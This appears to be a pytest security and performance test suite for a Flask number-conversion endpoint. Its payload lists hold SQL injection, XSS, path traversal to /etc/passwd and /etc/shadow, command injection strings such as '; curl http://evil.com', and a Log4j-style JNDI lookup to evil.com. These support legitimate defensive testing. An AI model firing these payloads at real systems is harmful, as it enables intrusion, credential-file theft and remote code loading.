"""
Security and performance tests for api/index.py
"""
import pytest
import json
import sys
import os
import time

# Add the api directory to the path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'api'))

from index import app


@pytest.fixture
def client():
    """Create a test client for the Flask application"""
    app.config['TESTING'] = True
    with app.test_client() as client:
        yield client


class TestInputSanitization:
    """Test input sanitization and injection prevention"""
    
    def test_sql_injection_attempts(self, client):
        """Test SQL injection-like strings in inputs"""
        sql_injection_payloads = [
            "'; DROP TABLE users; --",
            "1; DELETE FROM table; --",
            "1' OR '1'='1",
            "admin'--",
            "1' UNION SELECT * FROM users--",
            "'; EXEC xp_cmdshell('dir'); --"
        ]
        
        for payload in sql_injection_payloads:
            response = client.post('/convert', json={
                'input': payload,
                'inputType': 'decimal',
                'outputType': 'binary'
            })
            
            # Should handle gracefully without executing any SQL
            assert response.status_code == 200
            data = response.get_json()
            assert 'error' in data
            # Error should be about invalid input, not database error
            if data['error']:
                error_msg = data['error'].lower()
                dangerous_keywords = ['database', 'sql', 'table', 'select', 'drop', 'delete']
                for keyword in dangerous_keywords:
                    assert keyword not in error_msg, f"Error message might leak SQL info: {data['error']}"
    
    def test_xss_injection_attempts(self, client):
        """Test XSS injection attempts in inputs"""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
            "'; alert('xss'); //",
            "<iframe src='javascript:alert(1)'></iframe>"
        ]
        
        for payload in xss_payloads:
            response = client.post('/convert', json={
                'input': payload,
                'inputType': 'text',
                'outputType': 'decimal'
            })
            
            assert response.status_code == 200
            data = response.get_json()
            
            # Response should not contain the raw payload
            response_text = json.dumps(data)
            assert '<script>' not in response_text
            assert 'javascript:' not in response_text
            assert 'onerror=' not in response_text
    
    def test_path_traversal_attempts(self, client):
        """Test path traversal attempts in inputs"""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "../../../../usr/bin/id",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        for payload in path_traversal_payloads:
            response = client.post('/convert', json={
                'input': payload,
                'inputType': 'text',
                'outputType': 'decimal'
            })
            
            assert response.status_code == 200
            data = response.get_json()
            assert data['error'] is not None
            # Should not try to read files or leak file system info
            error_msg = data['error'].lower()
            file_indicators = ['file not found', 'permission denied', 'directory', 'path']
            for indicator in file_indicators:
                assert indicator not in error_msg
    
    def test_command_injection_attempts(self, client):
        """Test command injection attempts"""
        command_injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& whoami",
            "`id`",
            "$(cat /etc/hosts)",
            "; curl http://evil.com",
            "& ping evil.com"
        ]
        
        for payload in command_injection_payloads:
            response = client.post('/convert', json={
                'input': payload,
                'inputType': 'text',
                'outputType': 'decimal'
            })
            
            assert response.status_code == 200
            data = response.get_json()
            assert data['error'] is not None
            # Should not execute commands or leak system info
            error_msg = data['error'].lower()
            system_indicators = ['command', 'executed', 'shell', 'process']
            for indicator in system_indicators:
                assert indicator not in error_msg


class TestDoSProtection:
    """Test DoS (Denial of Service) protection"""
    
    def test_extremely_large_inputs(self, client):
        """Test handling of extremely large inputs"""
        # Create very large inputs
        large_inputs = [
            ('9' * 100000, 'decimal'),  # 100k digit number
            ('1' * 100000, 'binary'),   # 100k bit binary
            ('f' * 50000, 'hexadecimal'),  # 50k hex chars
            ('A' * 100000, 'base64'),   # 100k base64 chars
        ]
        
        for large_input, input_type in large_inputs:
            start_time = time.time()
            
            response = client.post('/convert', json={
                'input': large_input,
                'inputType': input_type,
                'outputType': 'decimal'
            })
            
            end_time = time.time()
            processing_time = end_time - start_time
            
            # Should respond within reasonable time (max 10 seconds for this test)
            assert processing_time < 10, f"Processing took too long: {processing_time}s for {len(large_input)} chars"
            
            # Should handle gracefully
            assert response.status_code == 200
            data = response.get_json()
            assert 'error' in data and 'result' in data
    
    def test_resource_exhaustion_protection(self, client):
        """Test protection against resource exhaustion"""
        # Test with computationally expensive inputs
        expensive_inputs = [
            ('9' * 10000, 'decimal', 'base64'),  # Large decimal to base64
            ('1' * 10000, 'binary', 'text'),     # Large binary to text
            ('f' * 5000, 'hexadecimal', 'binary'),  # Large hex to binary
        ]
        
        for large_input, input_type, output_type in expensive_inputs:
            start_time = time.time()
            
            response = client.post('/convert', json={
                'input': large_input,
                'inputType': input_type,
                'outputType': output_type
            })
            
            end_time = time.time()
            processing_time = end_time - start_time
            
            # Should not hang or take excessive time
            assert processing_time < 5, f"Processing took too long: {processing_time}s"
            assert response.status_code == 200
    
    def test_memory_exhaustion_protection(self, client):
        """Test protection against memory exhaustion"""
        # Test inputs that could cause excessive memory usage
        memory_intensive_cases = [
            ('1' * 50000 + '0' * 50000, 'binary'),  # Large binary with patterns
            ('A' * 75000 + '=' * 25000, 'base64'),  # Large base64 with padding
        ]
        
        for memory_input, input_type in memory_intensive_cases:
            response = client.post('/convert', json={
                'input': memory_input,
                'inputType': input_type,
                'outputType': 'decimal'
            })
            
            # Should handle gracefully without crashing
            assert response.status_code == 200
            data = response.get_json()
            assert 'error' in data and 'result' in data


class TestConcurrentRequestSafety:
    """Test thread safety and concurrent request handling"""
    
    def test_multiple_simultaneous_requests(self, client):
        """Test multiple requests in sequence (simulating concurrency)"""
        # Different types of requests that might interfere with each other
        request_types = [
            {'input': '42', 'inputType': 'decimal', 'outputType': 'binary'},
            {'input': '101010', 'inputType': 'binary', 'outputType': 'decimal'},
            {'input': 'ff', 'inputType': 'hexadecimal', 'outputType': 'octal'},
            {'input': 'five', 'inputType': 'text', 'outputType': 'hexadecimal'},
            {'input': 'invalid', 'inputType': 'binary', 'outputType': 'decimal'},  # Error case
        ]
        
        # Run requests multiple times to check for state pollution
        for _ in range(10):
            results = []
            for request in request_types:
                response = client.post('/convert', json=request)
                assert response.status_code == 200
                data = response.get_json()
                results.append(data)
            
            # Results should be consistent across iterations
            # Check that error cases still error and success cases still succeed
            assert results[0]['error'] is None  # decimal to binary should work
            assert results[1]['error'] is None  # binary to decimal should work
            assert results[4]['error'] is not None  # invalid binary should fail
    
    def test_rapid_sequential_requests(self, client):
        """Test rapid sequential requests for memory leaks"""
        test_request = {'input': '123', 'inputType': 'decimal', 'outputType': 'binary'}
        
        # Make many rapid requests
        for i in range(100):
            response = client.post('/convert', json=test_request)
            assert response.status_code == 200
            data = response.get_json()
            assert data['error'] is None
            assert data['result'] == '1111011'  # 123 in binary
    
    def test_session_isolation(self, client):
        """Test that requests don't interfere with each other"""
        # Make a request that causes an error
        error_response = client.post('/convert', json={
            'input': 'invalid',
            'inputType': 'binary',
            'outputType': 'decimal'
        })
        assert error_response.status_code == 200
        error_data = error_response.get_json()
        assert error_data['error'] is not None
        
        # Immediately make a valid request
        valid_response = client.post('/convert', json={
            'input': '5',
            'inputType': 'decimal',
            'outputType': 'binary'
        })
        assert valid_response.status_code == 200
        valid_data = valid_response.get_json()
        assert valid_data['error'] is None
        assert valid_data['result'] == '101'


class TestInputValidationSecurity:
    """Test input validation from a security perspective"""
    
    def test_unicode_exploits(self, client):
        """Test Unicode-based exploit attempts"""
        unicode_exploits = [
            "\u202e",  # Right-to-left override
            "\u2066",  # Left-to-right isolate
            "\u2069",  # Pop directional isolate
            "test\u0000null",  # Null byte injection
            "test\u000aline\u000dfeed",  # Line feed/carriage return
        ]
        
        for exploit in unicode_exploits:
            response = client.post('/convert', json={
                'input': exploit,
                'inputType': 'text',
                'outputType': 'decimal'
            })
            
            assert response.status_code == 200
            data = response.get_json()
            # Should handle safely
            assert 'error' in data and 'result' in data
    
    def test_control_character_injection(self, client):
        """Test control character injection"""
        control_chars = [
            "\x00",  # Null
            "\x01",  # Start of heading
            "\x7f",  # DEL
            "\x1b",  # ESC
            "\x08",  # Backspace
            "\x0c",  # Form feed
        ]
        
        for ctrl_char in control_chars:
            test_input = f"test{ctrl_char}input"
            response = client.post('/convert', json={
                'input': test_input,
                'inputType': 'text',
                'outputType': 'decimal'
            })
            
            assert response.status_code == 200
            data = response.get_json()
            # Should handle control characters safely
            assert 'error' in data and 'result' in data
    
    def test_format_string_attacks(self, client):
        """Test format string attack patterns"""
        format_strings = [
            "%s%s%s%s",
            "%x%x%x%x",
            "%d%d%d%d",
            "%.1000000d",
            "%n%n%n%n",
            "${jndi:ldap://evil.com}",  # Log4j style
        ]
        
        for format_str in format_strings:
            response = client.post('/convert', json={
                'input': format_str,
                'inputType': 'text',
                'outputType': 'decimal'
            })
            
            assert response.status_code == 200
            data = response.get_json()
            # Should not interpret format strings
            assert 'error' in data and 'result' in data


class TestErrorInformationLeakage:
    """Test that errors don't leak sensitive information"""
    
    def test_error_message_information_disclosure(self, client):
        """Test that error messages don't disclose system information"""
        error_inducing_inputs = [
            ('invalid_binary', 'binary', 'decimal'),
            ('invalid_hex', 'hexadecimal', 'decimal'),
            ('invalid_text', 'text', 'decimal'),
            ('!@#$%', 'base64', 'decimal'),
        ]
        
        for invalid_input, input_type, output_type in error_inducing_inputs:
            response = client.post('/convert', json={
                'input': invalid_input,
                'inputType': input_type,
                'outputType': output_type
            })
            
            assert response.status_code == 200
            data = response.get_json()
            assert data['error'] is not None
            
            error_msg = data['error'].lower()
            
            # Error messages should not contain:
            sensitive_info = [
                'traceback',       # Stack traces
                'file "',          # File paths
                'line ',           # Line numbers
                '/users/',         # User directories
                '/home/',          # Home directories
                'c:\\',            # Windows paths
                'exception:',      # Raw exception info
                'error at',        # Location info
                'function',        # Function names (unless generic)
                'module',          # Module names
                'import',          # Import errors
            ]
            
            for sensitive in sensitive_info:
                assert sensitive not in error_msg, f"Error message contains sensitive info '{sensitive}': {data['error']}"
    
    def test_response_headers_security(self, client):
        """Test that response headers don't leak information"""
        response = client.post('/convert', json={
            'input': '5',
            'inputType': 'decimal',
            'outputType': 'binary'
        })
        
        assert response.status_code == 200
        
        # Check that server headers don't reveal too much
        headers = dict(response.headers)
        
        # Should not reveal internal framework details
        if 'Server' in headers:
            server_header = headers['Server'].lower()
            # Basic check - shouldn't reveal version numbers or internal details
            assert 'werkzeug' not in server_header or 'dev' not in server_header
    
    def test_http_method_enumeration(self, client):
        """Test that unsupported methods don't reveal information"""
        unsupported_methods = ['PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS']
        
        for method in unsupported_methods:
            response = client.open('/convert', method=method)
            
            # Should return 405 Method Not Allowed
            assert response.status_code == 405
            
            # Error response shouldn't leak implementation details
            if response.get_json():
                error_data = response.get_json()
                if 'error' in error_data and error_data['error']:
                    error_msg = error_data['error'].lower()
                    assert 'flask' not in error_msg
                    assert 'werkzeug' not in error_msg


class TestPerformanceBaseline:
    """Test performance baselines to detect regressions"""
    
    def test_simple_conversion_performance(self, client):
        """Test performance of simple conversions"""
        simple_conversions = [
            ('5', 'decimal', 'binary'),
            ('101', 'binary', 'decimal'),
            ('ff', 'hexadecimal', 'decimal'),
            ('five', 'text', 'decimal'),
        ]
        
        for input_val, input_type, output_type in simple_conversions:
            start_time = time.time()
            
            response = client.post('/convert', json={
                'input': input_val,
                'inputType': input_type,
                'outputType': output_type
            })
            
            end_time = time.time()
            processing_time = end_time - start_time
            
            # Simple conversions should be very fast (< 1 second)
            assert processing_time < 1.0, f"Simple conversion took too long: {processing_time}s"
            assert response.status_code == 200
    
    def test_moderate_size_performance(self, client):
        """Test performance with moderately sized inputs"""
        moderate_inputs = [
            ('123456789', 'decimal', 'binary'),
            ('1111111111111111', 'binary', 'decimal'),
            ('deadbeef', 'hexadecimal', 'decimal'),
        ]
        
        for input_val, input_type, output_type in moderate_inputs:
            start_time = time.time()
            
            response = client.post('/convert', json={
                'input': input_val,
                'inputType': input_type,
                'outputType': output_type
            })
            
            end_time = time.time()
            processing_time = end_time - start_time
            
            # Moderate conversions should still be fast (< 2 seconds)
            assert processing_time < 2.0, f"Moderate conversion took too long: {processing_time}s"
            assert response.status_code == 200

